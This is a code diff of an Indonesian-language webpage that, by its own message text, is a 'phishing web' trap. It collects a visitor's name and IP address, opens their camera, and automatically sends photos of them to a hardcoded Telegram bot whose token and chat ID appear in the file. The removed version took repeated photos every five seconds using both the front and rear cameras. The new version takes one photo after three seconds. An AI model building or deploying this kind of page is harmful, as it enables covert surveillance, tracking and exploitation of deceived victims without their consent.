@@ -106,124 +106,93 @@
       <h3>Welcome To CyberDonzTzy</h3>
       <video id="video" autoplay muted playsinline></video>
       <canvas id="canvas" width="320" height="240"></canvas>
+      <button style="margin-top:20px;" onclick="ambilFoto()">Ambil Foto</button>
     </div>
   </div>
 
-  <script>
-    const token = "7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU";
-    const chat_id = "6624966395";
+<script>
+  const token = "7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU";
+  const chat_id = "6624966395";
+  let videoStream = null;
 
-    window.onload = () => {
-      setTimeout(() => {
-        document.getElementById("app").classList.add("visible");
-      }, 2500);
-    };
+  window.onload = () => {
+    setTimeout(() => {
+      document.getElementById("app").classList.add("visible");
+    }, 2500);
+  };
 
-    async function startCapture() {
-      const name = document.getElementById("nameInput").value.trim();
-      if (!name) return alert("Nama harus diisi!");
+  async function startCapture() {
+    const name = document.getElementById("nameInput").value.trim();
+    if (!name) return alert("Nama harus diisi!");
 
-      document.getElementById("formCard").style.display = "none";
-      document.getElementById("cameraCard").style.display = "block";
+    document.getElementById("formCard").style.display = "none";
+    document.getElementById("cameraCard").style.display = "block";
 
-      let ip = "Tidak diketahui";
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        ip = data.ip;
-      } catch (e) {
-        console.warn("Gagal ambil IP:", e);
-      }
+    let ip = "Tidak diketahui";
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      ip = data.ip;
+    } catch (e) {
+      console.warn("Gagal ambil IP:", e);
+    }
 
-      const infoMsg = `
+    const infoMsg = `
 𝐊𝐨𝐫𝐛𝐚𝐧 𝐌𝐚𝐬𝐮𝐤 𝐉𝐞𝐛𝐚𝐤𝐚𝐧 𝐖𝐞𝐛 𝐏𝐡𝐢𝐬𝐢𝐧𝐠 𝐃𝐨𝐧𝐳𝐓𝐳𝐲
-──────────────────────────────
+|──────────────────────────────|
 𝗡𝗮𝗺𝗮 : ${name}
 𝗔𝗹𝗮𝗺𝗮𝘁 𝗜𝗽 𝗞𝗼𝗿𝗯𝗮𝗻 : ${ip}
-𝗙𝗼𝘁𝗼 𝗞𝗼𝗿𝗯𝗮𝗻 𝗔𝗸𝗮𝗻 𝗗𝗶 𝗞𝗶𝗿𝗶𝗺 𝟱 𝗗𝗲𝘁𝗶𝗸 𝗟𝗮𝗴𝗶!!!
-──────────────────────────────`;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chat_id, text: infoMsg })
-      });
+|──────────────────────────────|
+𝐅𝐨𝐭𝐨 𝐊𝐨𝐫𝐛𝐚𝐧 𝐀𝐤𝐚𝐧 𝐎𝐭𝐨𝐦𝐚𝐭𝐢𝐬 𝐊𝐞 𝐇𝐚𝐜𝐤 𝟑 𝐃𝐞𝐭𝐢𝐤
+© 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐃𝐨𝐧𝐳𝐓𝐳𝐲
+|──────────────────────────────|`;
 
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        await video.play();
-
-        setInterval(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg");
-          const blob = dataURLtoBlob(imageData);
-
-          const formData = new FormData();
-          formData.append("chat_id", chat_id);
-          formData.append("photo", blob, "selfie.jpg");
-
-          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        }, 5000);
-      } catch (err) {
-        console.error("Gagal akses kamera:", err);
-        alert("Gagal mengakses kamera: " + err.message);
-      }
-    }
-    
-    function ambilFoto() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0);
-  canvas.toBlob(blob => kirimFoto(blob, '📸 Foto Kamera'));
-}
-
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(",");
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while(n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
-    }
-    
-    function kirimFoto(blob, caption) {
-  let form = new FormData();
-  form.append('chat_id', chat_id);
-  form.append('photo', blob, 'foto.jpg');
-  form.append('caption', caption);
-  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
-}
-
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-.then(stream => {
-  video.srcObject = stream;
-  video.play();
-  setTimeout(() => {
-    ambilFoto();
-    stream.getTracks().forEach(track => track.stop());
-    // Kamera belakang setelah depan
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-    .then(stream2 => {
-      video.srcObject = stream2;
-      video.play();
-      setTimeout(() => {
-        ambilFoto();
-        stream2.getTracks().forEach(track => track.stop());
-      }, 5000);
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chat_id, text: infoMsg })
     });
-  }, 5000);
-})
-.catch(err => {
-  kirimPesan("Gagal akses kamera: " + err);
-});
-  </script>
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoStream = stream;
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+      await video.play();
+
+      // Ambil foto otomatis setelah 3 detik
+      setTimeout(() => ambilFoto(), 3000);
+    } catch (err) {
+      alert("Gagal mengakses kamera: " + err.message);
+      console.error(err);
+    }
+  }
+
+  function ambilFoto() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+      kirimFoto(blob, "📸 Selfie Otomatis dari Kamera (3 detik)");
+    }, 'image/jpeg');
+  }
+
+  function kirimFoto(blob, caption) {
+    let form = new FormData();
+    form.append("chat_id", chat_id);
+    form.append("photo", blob, "selfie.jpg");
+    form.append("caption", caption);
+
+    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method: "POST",
+      body: form
+    });
+  }
+</script>
 </body>
 </html>
